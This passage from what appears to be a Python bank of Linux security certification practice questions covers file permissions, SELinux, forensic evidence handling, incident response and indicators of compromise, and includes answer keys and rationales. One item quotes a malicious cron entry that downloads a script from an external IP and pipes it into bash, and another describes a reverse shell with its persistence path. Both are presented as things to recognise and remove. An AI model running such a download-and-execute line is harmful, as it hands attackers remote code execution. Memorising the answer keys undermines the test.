                          "777 granting DAC access, the SELinux type enforcement policy (based on the file's "
                          "context, e.g., needing httpd_sys_rw_content_t) still blocks the write if the label "
                          "doesn't permit it, and no chmod command can change that."},
            {"id": "b", "text": "chmod 777 is invalid syntax on SELinux-enabled systems and silently fails", "correct": False,
             "rationale": "Incorrect. chmod 777 is valid, standard syntax and does change the DAC permission "
                          "bits successfully; the failure is a separate SELinux policy denial layered on top."},
            {"id": "c", "text": "Apache is running as a non-privileged user and 777 permissions do not apply to non-root processes", "correct": False,
             "rationale": "Incorrect. 777 grants read/write/execute to owner, group, AND other, so any process "
                          "regardless of user would have DAC access; the block is coming from SELinux, not DAC."},
            {"id": "d", "text": "The disk is mounted read-only, which chmod cannot override", "correct": False,
             "rationale": "Incorrect. Nothing in the scenario indicates a read-only mount, and an AVC denial in "
                          "the audit log specifically points to SELinux policy enforcement, not a mount-option issue."},
        ],
        "explanation": (
            "SELinux enforces MAC via type enforcement independently of standard DAC permission bits. Fixing "
            "this requires correcting the file's SELinux context (e.g., with chcon/restorecon or semanage "
            "fcontext) rather than adjusting chmod/chown, which only affects DAC."
        ),
    },
    {
        "id": "tlnx-021",
        "domain": 4,
        "objective": "4.6",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Access control models",
        "stem": (
            "A shared configuration file /etc/app/db_creds.conf currently is owned by 'alice:developers' with "
            "mode 640. It contains a database password and should only ever be readable by the 'appsvc' service "
            "account, per least privilege. Which pair of commands correctly enforces this?"
        ),
        "options": [
            {"id": "a", "text": "chown appsvc:appsvc /etc/app/db_creds.conf && chmod 600 /etc/app/db_creds.conf", "correct": True,
             "rationale": "Correct. Changing ownership to appsvc and setting mode 600 restricts all access "
                          "(read and write) to only the appsvc account, removing the developers group's read "
                          "access that 640 currently allows."},
            {"id": "b", "text": "chmod 640 /etc/app/db_creds.conf", "correct": False,
             "rationale": "Incorrect. This is the file's current permission and ownership already; it does "
                          "nothing to restrict access away from the developers group, which can still read it."},
            {"id": "c", "text": "chown appsvc:developers /etc/app/db_creds.conf && chmod 644 /etc/app/db_creds.conf", "correct": False,
             "rationale": "Incorrect. 644 makes the file world-readable, and keeping the developers group "
                          "assigned means the credential is exposed even more broadly than before, not less."},
            {"id": "d", "text": "chmod 000 /etc/app/db_creds.conf", "correct": False,
             "rationale": "Incorrect. Mode 000 blocks every account, including appsvc, from reading the file at "
                          "all, which would break the application rather than granting it least-privilege access."},
        ],
        "explanation": (
            "Enforcing least privilege on a sensitive credential file requires both correct ownership (appsvc, "
            "not a shared developers group) and a restrictive mode (600, owner-only) so no other account, "
            "including the file's own group, can read the secret."
        ),
    },
    {
        "id": "tlnx-022",
        "domain": 4,
        "objective": "4.6",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Access control models",
        "stem": (
            "A DevOps team wants a shared script directory /opt/scripts to be readable and executable by every "
            "member of the 'ops' group, writable only by the directory owner, and completely inaccessible to "
            "any other account on the system. Which mode correctly implements this?"
        ),
        "options": [
            {"id": "a", "text": "chmod 750 /opt/scripts (with group ownership set to ops)", "correct": True,
             "rationale": "Correct. 750 grants the owner read/write/execute (7), the group read/execute (5), "
                          "and other no access at all (0) — exactly matching owner-write, group read+execute, "
                          "and no access for everyone else."},
            {"id": "b", "text": "chmod 770 /opt/scripts", "correct": False,
             "rationale": "Incorrect. 770 grants the group full read/write/execute, allowing any ops member to "
                          "modify the scripts, which exceeds the read/execute-only requirement for the group."},
            {"id": "c", "text": "chmod 755 /opt/scripts", "correct": False,
             "rationale": "Incorrect. The trailing 5 grants read/execute to 'other' (everyone on the system), "
                          "violating the requirement that non-group accounts have no access at all."},
            {"id": "d", "text": "chmod 640 /opt/scripts", "correct": False,
             "rationale": "Incorrect. This denies execute permission to both the group and the owner, which "
                          "would prevent anyone from actually running the scripts in the directory."},
        ],
        "explanation": (
            "The three permission triads map directly to owner/group/other: 750 gives the owner full control, "
            "the group read+execute only (no modification), and completely denies access to all other accounts."
        ),
    },
    {
        "id": "tlnx-023",
        "domain": 4,
        "objective": "4.6",
        "type": "multiple_response",
        "difficulty": "hard",
        "study_topic": "Access control models",
        "stem": (
            "Select the TWO statements that correctly distinguish Linux discretionary access control (DAC, "
            "standard chmod/chown permissions) from SELinux mandatory access control (MAC)."
        ),
        "options": [
            {"id": "a", "text": "Under DAC, the resource owner can grant or revoke access at will; under MAC, access is governed by a system-wide policy that even the resource owner cannot override", "correct": True,
             "rationale": "Correct. This is the fundamental distinction: DAC access decisions are made by the "
                          "individual owner, while MAC access decisions are made centrally by policy regardless "
                          "of ownership."},
            {"id": "b", "text": "SELinux enforces access using security contexts/labels evaluated by policy, in addition to and independent of standard chmod/chown bits", "correct": True,
             "rationale": "Correct. SELinux type enforcement checks a process's domain against a file's type "
                          "label; this check happens on top of, and separately from, the traditional DAC "
                          "permission bits."},
            {"id": "c", "text": "Setting SELinux to 'permissive' mode removes the need for chmod/chown permissions entirely", "correct": False,
             "rationale": "Incorrect. Permissive mode only stops SELinux from blocking actions (it logs denials "
                          "instead), but standard DAC permissions are always enforced regardless of the SELinux "
                          "mode."},
            {"id": "d", "text": "DAC and MAC are mutually exclusive — a Linux system can only use one or the other, never both at the same time", "correct": False,
             "rationale": "Incorrect. On an SELinux-enabled system, DAC (chmod/chown) and MAC (SELinux policy) "
                          "are both evaluated for every access; an action must pass both checks to succeed."},
        ],
        "explanation": (
            "DAC lets the owner control access; SELinux's MAC layer applies an independent, centrally defined "
            "policy on top of DAC, based on security context labels rather than ownership, and both layers are "
            "always active together — not mutually exclusive or replaced by mode changes."
        ),
    },

    # ---------------------------------------------------------------
    # Digital forensics (5) — domain 4, objective 4.9
    # ---------------------------------------------------------------
    {
        "id": "tlnx-024",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Digital forensics",
        "stem": (
            "A forensic responder arrives at a live, compromised Linux server that must eventually be powered "
            "off for imaging. Per the order of volatility, which action should be performed FIRST, before the "
            "system is shut down?"
        ),
        "options": [
            {"id": "a", "text": "Capture volatile data such as running processes (ps aux), active network connections (ss -tulpn), and RAM contents", "correct": True,
             "rationale": "Correct. RAM, running process state, and active network connections are the most "
                          "volatile evidence and are permanently lost at power-off, so they must be captured "
                          "before the disk image is taken or the machine is shut down."},
            {"id": "b", "text": "Power off the server immediately to preserve the disk in its current state", "correct": False,
             "rationale": "Incorrect. Powering off first destroys all volatile evidence (RAM, running processes, "
                          "network state) permanently, violating the order of volatility."},
            {"id": "c", "text": "Run 'chmod 444 /var/log/*' to make the log files read-only", "correct": False,
             "rationale": "Incorrect. While protecting logs from tampering is good practice, it is not the "
                          "first priority and does not address the most volatile evidence, which disappears at "
                          "shutdown regardless of log file permissions."},
            {"id": "d", "text": "Create a full disk image using 'dd' before recording any running process information", "correct": False,
             "rationale": "Incorrect. Disk contents are far less volatile than RAM and live process/network "
                          "state; capturing the disk image first (without powering off) is acceptable, but "
                          "prioritizing it ahead of volatile memory/process capture violates the order of "
                          "volatility."},
        ],
        "explanation": (
            "The order of volatility places RAM, running processes, and network connections above disk and "
            "logs. On a live compromised host, this data must be captured first because it is lost the moment "
            "the machine is powered down or the processes exit."
        ),
    },
    {
        "id": "tlnx-025",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Digital forensics",
        "stem": (
            "Before and after imaging a suspect Linux disk with 'dd if=/dev/sdb of=/evidence/disk.img bs=4M "
            "conv=noerror,sync', an examiner needs to cryptographically prove the image is a bit-for-bit, "
            "unaltered copy of the source for chain-of-custody purposes. Which command should be run against "
            "both the source device and the resulting image file?"
        ),
        "options": [
            {"id": "a", "text": "sha256sum /dev/sdb and sha256sum /evidence/disk.img, then compare the two hash values", "correct": True,
             "rationale": "Correct. Computing a cryptographic hash of both the source device and the resulting "
                          "image and confirming they match is the standard method for proving integrity and an "
                          "exact bit-for-bit copy for chain of custody."},
            {"id": "b", "text": "diff -q /dev/sdb /evidence/disk.img", "correct": False,
             "rationale": "Incorrect. Running diff directly against a raw block device is unreliable and not "
                          "the accepted forensic practice; hashing is the standard, court-defensible integrity "
                          "verification method."},
            {"id": "c", "text": "chmod 400 /evidence/disk.img", "correct": False,
             "rationale": "Incorrect. Restricting the image file's permissions helps prevent tampering going "
                          "forward but does not itself prove the image matches the source device."},
            {"id": "d", "text": "gzip -t /evidence/disk.img", "correct": False,
             "rationale": "Incorrect. gzip -t only tests whether a gzip-compressed archive is internally "
                          "consistent; it does not verify the image content matches the original source device."},
        ],
        "explanation": (
            "Forensic integrity verification relies on cryptographic hashing (e.g., sha256sum or md5sum) of "
            "both source and destination, with matching hashes documented in the chain-of-custody record to "
            "prove the image is an exact, unaltered copy."
        ),
    },
    {
        "id": "tlnx-026",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Digital forensics",
        "stem": (
            "A responder collects /var/log/auth.log from a compromised server as evidence for a potential legal "
            "case. Beyond hashing the file, what additional documentation is required to maintain proper chain "
            "of custody?"
        ),
        "options": [
            {"id": "a", "text": "A signed log documenting who collected the evidence, exactly when, from where, and every person who subsequently accessed or transferred it", "correct": True,
             "rationale": "Correct. Chain of custody requires an unbroken, signed record of every person who "
                          "handled the evidence and when, so its integrity and origin can be defended if "
                          "challenged in legal proceedings."},
            {"id": "b", "text": "Renaming the file to include the analyst's name so ownership is obvious", "correct": False,
             "rationale": "Incorrect. Renaming the evidence file does not constitute a custody record and could "
                          "even be seen as altering the original evidence; a separate documented log is required."},
            {"id": "c", "text": "Emailing the log file to the entire security team for visibility", "correct": False,
             "rationale": "Incorrect. Broadly distributing evidence without tracking each recipient breaks the "
                          "chain of custody rather than maintaining it, and does not create the required "
                          "documentation trail."},
            {"id": "d", "text": "Compressing the log with gzip to save storage space", "correct": False,
             "rationale": "Incorrect. Compression is a storage/handling convenience unrelated to establishing "
                          "custody documentation, and altering the file's form without recording it can itself "
                          "raise integrity questions."},
        ],
        "explanation": (
            "Chain of custody is a documentation requirement, not just a technical hashing step: every handoff, "
            "access, and location change for the evidence must be logged and signed to preserve its "
            "admissibility and defend its integrity later."
        ),
    },
    {
        "id": "tlnx-027",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Digital forensics",
        "stem": (
            "A forensic examiner needs to mount an acquired disk image on an analysis workstation to review "
            "files, but must guarantee that nothing on the analysis workstation can modify the image data during "
            "review. Which mount approach is correct?"
        ),
        "options": [
            {"id": "a", "text": "mount -o ro,noload /evidence/disk.img /mnt/analysis", "correct": True,
             "rationale": "Correct. Mounting with the 'ro' (read-only) option, and 'noload' to skip filesystem "
                          "journal replay (which could otherwise write to the image), prevents any modification "
                          "of the evidence during analysis."},
            {"id": "b", "text": "mount /evidence/disk.img /mnt/analysis", "correct": False,
             "rationale": "Incorrect. A default read-write mount can allow journal replay or accidental writes "
                          "that alter the evidence image, undermining forensic integrity."},
            {"id": "c", "text": "mount -o rw /evidence/disk.img /mnt/analysis", "correct": False,
             "rationale": "Incorrect. Explicitly mounting read-write guarantees the image can be modified, which "
                          "is the opposite of the forensic requirement."},
            {"id": "d", "text": "chmod 777 /evidence/disk.img before mounting", "correct": False,
             "rationale": "Incorrect. Loosening the image file's own permissions does not make the mounted "
                          "filesystem read-only, and unnecessarily exposes the evidence file to modification by "
                          "any local user."},
        ],
        "explanation": (
            "Forensic best practice mounts evidence read-only (ro) and disables journal replay (noload for "
            "ext3/ext4) to guarantee the analysis workstation cannot alter the acquired image, preserving its "
            "integrity for any subsequent verification."
        ),
    },
    {
        "id": "tlnx-028",
        "domain": 4,
        "objective": "4.9",
        "type": "multiple_response",
        "difficulty": "expert",
        "study_topic": "Digital forensics",
        "stem": (
            "A forensic first responder reaches a live, suspected-compromised Linux server that cannot be taken "
            "offline immediately. Select the THREE actions that follow sound forensic practice for this "
            "situation."
        ),
        "options": [
            {"id": "a", "text": "Capture volatile data (RAM, running processes, network connections) before making any other changes to the system", "correct": True,
             "rationale": "Correct. Following the order of volatility, the most perishable evidence must be "
                          "captured first, before any action that could alter memory or process state."},
            {"id": "b", "text": "Compute and record a cryptographic hash of any files or images collected, before and after transfer", "correct": True,
             "rationale": "Correct. Hashing at each stage proves integrity was preserved through collection and "
                          "transfer, supporting the chain-of-custody record."},
            {"id": "c", "text": "Document every command executed, along with timestamps and the responder's identity, in a chain-of-custody log", "correct": True,
             "rationale": "Correct. A detailed, timestamped, attributed record of every action taken on the "
                          "evidence is required to defend its integrity and admissibility later."},
            {"id": "d", "text": "Log in as root and immediately delete any suspicious files to stop the attacker", "correct": False,
             "rationale": "Incorrect. Deleting files destroys evidence and volatile artifacts, and taking "
                          "unilateral eradication action before proper collection undermines both the "
                          "investigation and any later legal action."},
            {"id": "e", "text": "Reboot the server to clear any active malware from memory before investigating further", "correct": False,
             "rationale": "Incorrect. Rebooting destroys all volatile evidence (RAM contents, running "
                          "processes, active connections) that should have been the first thing captured, "
                          "violating the order of volatility."},
        ],
        "explanation": (
            "Sound forensic response prioritizes capturing volatile evidence, hashing collected data for "
            "integrity, and maintaining a documented chain of custody — never destroying evidence via premature "
            "deletion or a reboot before capture is complete."
        ),
    },

    # ---------------------------------------------------------------
    # Incident response process (5) — domain 4, objective 4.8
    # ---------------------------------------------------------------
    {
        "id": "tlnx-029",
        "domain": 4,
        "objective": "4.8",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Incident response process",
        "stem": (
            "During an active incident, an analyst confirms via 'ss -tulpn' and auth.log that a Linux web "
            "server is compromised and actively beaconing to an external C2 server. Business leadership wants "
            "to keep the server running to avoid downtime while the investigation continues. What is the most "
            "appropriate immediate containment action?"
        ),
        "options": [
            {"id": "a", "text": "Isolate the host at the network layer (e.g., move it to a quarantine VLAN or apply a host firewall rule blocking outbound C2 traffic) while keeping the OS running for further live analysis", "correct": True,
             "rationale": "Correct. Network isolation stops the attacker's command-and-control channel and "
                          "further data exfiltration while preserving the running system state (processes, "
                          "memory) for continued live forensic analysis, balancing containment with the "
                          "business's uptime request."},
            {"id": "b", "text": "Immediately power off the server to stop the attack", "correct": False,
             "rationale": "Incorrect. Powering off destroys volatile evidence and directly conflicts with the "
                          "stated business requirement to keep the server running; isolation achieves "
                          "containment without this cost."},
            {"id": "c", "text": "Take no action until the full root cause analysis is complete", "correct": False,
             "rationale": "Incorrect. Delaying containment while confirmed active C2 communication continues "
                          "allows ongoing damage/exfiltration; containment should happen promptly, in parallel "
                          "with continued investigation."},
            {"id": "d", "text": "Grant the attacker's IP address explicit allow rules to monitor their behavior indefinitely without any containment", "correct": False,
             "rationale": "Incorrect. Deliberately allowing continued unrestricted attacker access is not a "
                          "recognized containment strategy for this scenario and needlessly prolongs exposure "
                          "and risk."},
        ],
        "explanation": (
            "Containment aims to stop ongoing damage while preserving evidence and, where possible, business "
            "operations. Network-layer isolation (segmentation/quarantine) achieves this better than a full "
            "power-off when the system must stay available and live analysis needs to continue."
        ),
    },
    {
        "id": "tlnx-030",
        "domain": 4,
        "objective": "4.8",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Incident response process",
        "stem": (
            "An incident responder is about to begin eradication on a compromised Linux host, which includes "
            "removing a malicious cron job, a rogue user account, and a backdoored binary. What must happen "
            "immediately before eradication begins?"
        ),
        "options": [
            {"id": "a", "text": "Preserve evidence: capture relevant logs (auth.log, cron, journalctl output), running process and network state, and hash the artifacts to be removed", "correct": True,
             "rationale": "Correct. Once eradication actions (deleting the cron job, account, and binary) begin, "
                          "that evidence is gone. Evidence must be preserved and documented first so root cause "
                          "and scope can still be established and any later legal action supported."},
            {"id": "b", "text": "Immediately delete the malicious cron job to stop the persistence mechanism before doing anything else", "correct": False,
             "rationale": "Incorrect. Deleting the cron job before capturing/documenting it destroys evidence "
                          "needed to determine the full scope, root cause, and any related indicators of compromise."},
            {"id": "c", "text": "Notify all customers of the breach via public disclosure", "correct": False,
             "rationale": "Incorrect. Public disclosure decisions are a later step governed by legal/PR and "
                          "regulatory requirements, and are not a prerequisite for beginning eradication actions."},
            {"id": "d", "text": "Reformat the entire disk to guarantee the malware is gone before collecting any evidence", "correct": False,
             "rationale": "Incorrect. Reformatting destroys all evidence irreversibly before it can be captured, "
                          "eliminating any ability to determine scope, root cause, or support a legal case."},
        ],
        "explanation": (
            "Evidence preservation must precede eradication. Once malicious artifacts are deleted or accounts "
            "removed, that data cannot be recovered, so responders capture and hash relevant artifacts and logs "
            "first, then proceed to eradicate the threat."
        ),
    },
    {
        "id": "tlnx-031",
        "domain": 4,
        "objective": "4.8",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Incident response process",
        "stem": (
            "After capturing all necessary evidence, a responder needs to eradicate a confirmed malicious "
            "reverse-shell process (PID 8842, listening on port 4444) and its persistence entry in root's "
            "crontab ('* * * * * /usr/lib/.hidden/update.sh'). Which sequence of commands correctly performs "
            "eradication?"
        ),
        "options": [
            {"id": "a", "text": "kill -9 8842; crontab -u root -e (remove the malicious line); rm -f /usr/lib/.hidden/update.sh", "correct": True,
             "rationale": "Correct. This terminates the active malicious process, removes the cron persistence "
                          "entry so it cannot respawn the shell, and deletes the backdoor script itself — "
                          "addressing the process, the persistence mechanism, and the payload."},
            {"id": "b", "text": "kill -9 8842 only, leaving the crontab entry in place for later review", "correct": False,
             "rationale": "Incorrect. Leaving the cron entry intact means the malicious script will simply "
                          "relaunch the reverse shell at the next minute mark (per the '* * * * *' schedule), "
                          "undermining eradication."},
            {"id": "c", "text": "systemctl restart cron", "correct": False,
             "rationale": "Incorrect. Restarting the cron daemon does not remove the malicious crontab entry or "
                          "kill the running process; the persistence mechanism and active shell remain intact."},
            {"id": "d", "text": "chmod 000 /usr/lib/.hidden/update.sh, leaving the process and crontab entry running", "correct": False,
             "rationale": "Incorrect. Removing execute permission on the script does not stop the already-"
                          "running process (PID 8842) or prevent the crontab from attempting to re-invoke it, "
                          "so the compromise is not actually eradicated."},
        ],
        "explanation": (
            "Complete eradication of this compromise requires terminating the active malicious process, "
            "removing the cron-based persistence entry that would otherwise relaunch it, and deleting the "
            "malicious payload file — addressing all three layers of the compromise."
        ),
    },
    {
        "id": "tlnx-032",
        "domain": 4,
        "objective": "4.8",
        "type": "multiple_choice",
        "difficulty": "easy",
        "study_topic": "Incident response process",
        "stem": (
            "Two weeks after fully recovering a compromised Linux server (patched, restored from a known-good "
            "backup, and returned to production), the incident response team schedules a meeting to review "
            "what happened, how detection could have been faster, and what controls should be added. Which "
            "phase of the incident response process does this meeting represent?"
        ),
        "options": [
            {"id": "a", "text": "Lessons learned (post-incident review)", "correct": True,
             "rationale": "Correct. The post-incident/lessons-learned phase happens after recovery and focuses "
                          "on reviewing the response, identifying gaps, and improving processes and controls "
                          "for the future."},
            {"id": "b", "text": "Containment", "correct": False,
             "rationale": "Incorrect. Containment happens early, during the active incident, to limit spread "
                          "and damage — not two weeks after the system has already been fully recovered."},
            {"id": "c", "text": "Eradication", "correct": False,
             "rationale": "Incorrect. Eradication is the removal of the threat's root cause from the "
                          "environment, which already occurred before recovery; it is not a retrospective review meeting."},
            {"id": "d", "text": "Detection", "correct": False,
             "rationale": "Incorrect. Detection is the initial identification of the incident, which happened "
                          "well before recovery was completed, not a follow-up review meeting afterward."},
        ],
        "explanation": (
            "The NIST incident response lifecycle ends with lessons learned (post-incident activity), where the "
            "team reviews the timeline, effectiveness of detection/response, and updates procedures/controls to "
            "prevent recurrence — distinct from the earlier containment, eradication, and detection phases."
        ),
    },
    {
        "id": "tlnx-033",
        "domain": 4,
        "objective": "4.8",
        "type": "multiple_response",
        "difficulty": "hard",
        "study_topic": "Incident response process",
        "stem": (
            "A Linux server is confirmed compromised via a web application vulnerability, with a webshell "
            "dropped and a reverse shell established. Select the THREE actions, in the order a sound incident "
            "response process would generally require them to have occurred by the time the server is back in "
            "production, that are each individually appropriate IR activities."
        ),
        "options": [
            {"id": "a", "text": "Capture volatile data and preserve logs before any remediation changes are made", "correct": True,
             "rationale": "Correct. Evidence preservation must occur early, before eradication actions alter or "
                          "destroy the volatile and log-based evidence needed to determine scope and root cause."},
            {"id": "b", "text": "Remove the webshell and any attacker-created accounts, and patch the vulnerable application code", "correct": True,
             "rationale": "Correct. This is eradication: removing the attacker's tools/access and fixing the "
                          "root-cause vulnerability so the same exploitation path cannot be reused."},
            {"id": "c", "text": "Restore the application from a known-good backup and monitor closely for reinfection before fully returning to production", "correct": True,
             "rationale": "Correct. This is recovery: restoring clean, verified functionality and validating "
                          "with heightened monitoring before considering the incident closed."},
            {"id": "d", "text": "Immediately publish full technical details of the vulnerability on the company's public blog before eradication is complete", "correct": False,
             "rationale": "Incorrect. Publicly disclosing exploit details while the vulnerability may still be "
                          "present (or before eradication/recovery is verified complete) needlessly invites "
                          "further attacks and is not a standard IR activity performed mid-incident."},
            {"id": "e", "text": "Delete all server logs to reduce storage costs once the incident ticket is opened", "correct": False,
             "rationale": "Incorrect. Deleting logs destroys evidence needed for investigation and any legal "
                          "follow-up; this directly contradicts sound evidence-preservation practice."},
        ],
        "explanation": (
            "A sound IR process for this scenario follows preparation/detection with preservation (capture "
            "evidence), eradication (remove the webshell/accounts, patch the flaw), and recovery (restore from "
            "clean backup with heightened monitoring) — not premature public disclosure or log destruction."
        ),
    },

    # ---------------------------------------------------------------
    # Indicators of malicious activity (4) — domain 2, objective 2.4
    # ---------------------------------------------------------------
    {
        "id": "tlnx-034",
        "domain": 2,
        "objective": "2.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Indicators of malicious activity",
        "stem": (
            "While reviewing 'ss -tulpn' output on a finance department Linux workstation, an analyst notices "
            "an ESTABLISHED outbound connection from a process named 'kworker' (normally a kernel worker thread "
            "with no network activity) to an unfamiliar IP address on TCP port 8443, persisting for several "
            "hours. What does this most strongly indicate?"
        ),
        "options": [
            {"id": "a", "text": "Likely malware masquerading as a legitimate kernel process name to establish covert outbound C2 communication", "correct": True,
             "rationale": "Correct. Genuine kworker kernel threads never make outbound TCP network connections; "
                          "a userspace process using that name to talk to an external host on a non-standard "
                          "port is a classic process-masquerading indicator of malicious C2 activity."},
            {"id": "b", "text": "Normal kernel housekeeping traffic used for NTP time synchronization", "correct": False,
             "rationale": "Incorrect. NTP synchronization uses UDP port 123 through a dedicated time service, "
                          "not a long-lived TCP connection from a process impersonating a kernel worker thread."},
            {"id": "c", "text": "Expected behavior of the CUPS printing subsystem discovering network printers", "correct": False,
             "rationale": "Incorrect. CUPS printer discovery uses its own daemon and standard printing ports "
                          "(e.g., IPP/631), not a process named after a kernel worker thread on port 8443."},
            {"id": "d", "text": "A routine automatic security update check performed by the package manager", "correct": False,
             "rationale": "Incorrect. Package manager update checks run as identifiable processes like apt or "
                          "dnf/yum on standard HTTPS infrastructure, not disguised as a kernel thread name."},
        ],
        "explanation": (
            "Kernel worker threads (kworker/*) are scheduled kernel tasks and do not open network sockets. A "
            "process using that name to maintain an outbound connection is a strong indicator of malware "
            "attempting to blend in with legitimate system processes while communicating with a C2 server."
        ),
    },
    {
        "id": "tlnx-035",
        "domain": 2,
        "objective": "2.4",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Indicators of malicious activity",
        "stem": (
            "An analyst reviewing auth.log finds this repeated pattern from a single internal user account over "
            "ten minutes:\n\n"
            "'sudo: pam_unix(sudo:auth): authentication failure; logname=jsmith uid=1001 ... user=jsmith'\n"
            "(repeated 40 times, each attempting a different sudo command)\n\n"
            "What does this pattern most strongly suggest?"
        ),
        "options": [
            {"id": "a", "text": "A likely privilege escalation attempt, either the account owner or an attacker with jsmith's password repeatedly trying to gain elevated command access via sudo", "correct": True,
             "rationale": "Correct. Dozens of failed sudo authentication attempts against varying commands in a "
                          "short window is a strong indicator of an attempt (automated or manual) to brute-force "
                          "or abuse sudo privilege escalation."},
            {"id": "b", "text": "Normal behavior of the cron daemon running scheduled maintenance tasks", "correct": False,
             "rationale": "Incorrect. cron does not authenticate through sudo's PAM stack as a named user "
                          "attempting interactive privilege elevation; this log signature is specific to "
                          "sudo authentication failures."},
            {"id": "c", "text": "Expected output when a user simply checks their sudo privileges with 'sudo -l'", "correct": False,
             "rationale": "Incorrect. A single 'sudo -l' check produces at most one authentication event, not "
                          "40 repeated failures against different commands within minutes."},
            {"id": "d", "text": "A benign side effect of a scheduled log rotation via logrotate", "correct": False,
             "rationale": "Incorrect. logrotate manages log file rotation and does not generate sudo PAM "
                          "authentication failure entries for a specific user account."},
        ],
        "explanation": (
            "Repeated sudo authentication failures for varying commands in a short window are a classic "
            "indicator of a privilege escalation attempt and should trigger investigation of whether the "
            "account's credentials are compromised or being misused."
        ),
    },
    {
        "id": "tlnx-036",
        "domain": 2,
        "objective": "2.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Indicators of malicious activity",
        "stem": (
            "On an SELinux-enforcing RHEL server, the audit log (ausearch -m avc) suddenly shows repeated "
            "denials like:\n\n"
            "'type=AVC msg=audit(...): avc: denied { write } for pid=9021 comm=\"httpd\" name=\"shadow\" "
            "scontext=system_u:system_r:httpd_t ... tcontext=system_u:object_r:shadow_t'\n\n"
            "What does this AVC denial most strongly indicate about the httpd process?"
        ),
        "options": [
            {"id": "a", "text": "The web server process attempted to write to /etc/shadow, an action wildly outside its normal role, suggesting a compromised web app is attempting to modify user password hashes and SELinux correctly blocked it", "correct": True,
             "rationale": "Correct. httpd has no legitimate reason to write to the shadow password file. This "
                          "AVC denial shows SELinux's type enforcement blocking exactly the kind of malicious "
                          "action expected from a compromised web application trying to escalate or persist by "
                          "manipulating account credentials."},
            {"id": "b", "text": "SELinux is misconfigured and should be set to permissive mode so httpd can function normally", "correct": False,
             "rationale": "Incorrect. This denial reflects SELinux correctly protecting a highly sensitive file "
                          "from an unrelated service; switching to permissive would remove this protection and "
                          "let the malicious write succeed, which is the wrong response."},
            {"id": "c", "text": "This is routine, expected behavior every time the Apache web server starts up", "correct": False,
             "rationale": "Incorrect. A normal httpd startup never involves writing to /etc/shadow; this is "
                          "abnormal and should be treated as a strong indicator of compromise, not routine "
                          "service startup activity."},
            {"id": "d", "text": "The denial indicates a hardware disk failure unrelated to any security policy", "correct": False,
             "rationale": "Incorrect. An AVC denial is generated by SELinux policy enforcement, not by hardware "
                          "faults; the message explicitly identifies a type-enforcement access check, not a "
                          "storage error."},
        ],
        "explanation": (
            "AVC (Access Vector Cache) denials in the audit log record SELinux blocking an action that violates "
            "policy. httpd attempting to write to shadow_t-labeled /etc/shadow is well outside its expected "
            "httpd_t domain behavior and is a strong indicator of a compromised web application being "
            "successfully contained by SELinux."
        ),
    },
    {
        "id": "tlnx-037",
        "domain": 2,
        "objective": "2.4",
        "type": "multiple_choice",
        "difficulty": "medium",
        "study_topic": "Indicators of malicious activity",
        "stem": (
            "An analyst runs 'crontab -u www-data -l' on a web server and finds an entry that was not part of "
            "the approved deployment baseline:\n\n"
            "'*/5 * * * * curl -s http://185.220.101.7/x.sh | bash'\n\n"
            "What does this entry most strongly indicate?"
        ),
        "options": [
            {"id": "a", "text": "A likely persistence mechanism: the compromised account re-downloads and executes an attacker-controlled script every five minutes", "correct": True,
             "rationale": "Correct. A cron entry that silently pulls and pipes a remote script directly into "
                          "bash on a recurring schedule, under a service account and pointing to an unfamiliar "
                          "IP, is a textbook cron-based persistence mechanism used to survive reboots and "
                          "re-establish attacker access."},
            {"id": "b", "text": "A routine health-check script that the web server framework installs by default", "correct": False,
             "rationale": "Incorrect. No mainstream web framework installs a cron job that pipes a remote, "
                          "unauthenticated curl download directly into bash; this pattern is specific to "
                          "malicious persistence, not standard health checks."},
            {"id": "c", "text": "Expected behavior of logrotate cleaning up old web server logs every five minutes", "correct": False,
             "rationale": "Incorrect. logrotate is a separate utility configured under /etc/logrotate.d/ with "
                          "its own scheduling, and does not appear as a curl-to-bash entry in a service account's crontab."},
            {"id": "d", "text": "A normal apt/yum unattended-upgrade cron job", "correct": False,
             "rationale": "Incorrect. Unattended upgrade mechanisms use the distribution's package manager "
                          "against trusted repository infrastructure, not an arbitrary external IP address "
                          "piped straight into a shell."},
        ],
        "explanation": (
            "Piping a curl download from an unfamiliar external IP directly into bash on a recurring cron "
            "schedule is a well-known persistence technique: it lets an attacker re-establish control "
            "repeatedly even if a given payload instance is cleaned up, and is never legitimate baseline behavior."
        ),
    },

    # ---------------------------------------------------------------
    # Mitigation techniques (3) — domain 2, objective 2.5
    # ---------------------------------------------------------------
    {
        "id": "tlnx-038",
        "domain": 2,
        "objective": "2.5",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "Mitigation techniques",
        "stem": (
            "After a web application compromise, an analyst discovers the server was running SELinux in "
            "permissive mode ('getenforce' returned 'Permissive'), which allowed a webshell to write and "
            "execute a payload outside the web content directory without being blocked, though the attempt was "
            "logged. Which command should be applied as a mitigation to actively enforce policy going forward?"
        ),
        "options": [
            {"id": "a", "text": "setenforce 1 (and set SELINUX=enforcing in /etc/selinux/config to persist across reboots)", "correct": True,
             "rationale": "Correct. setenforce 1 immediately switches SELinux to enforcing mode so policy "
                          "violations are blocked rather than only logged, and updating /etc/selinux/config "
                          "makes the change persist after a reboot."},
            {"id": "b", "text": "setenforce 0", "correct": False,
             "rationale": "Incorrect. setenforce 0 switches SELinux to permissive mode, which is the insecure "
                          "state that allowed the attack to succeed in the first place — this would make the "
                          "problem worse, not fix it."},
            {"id": "c", "text": "systemctl disable auditd", "correct": False,
             "rationale": "Incorrect. Disabling the audit daemon removes visibility into AVC denials and other "
                          "security events, which is the opposite of an appropriate mitigation."},
            {"id": "d", "text": "chmod 777 /etc/selinux/config", "correct": False,
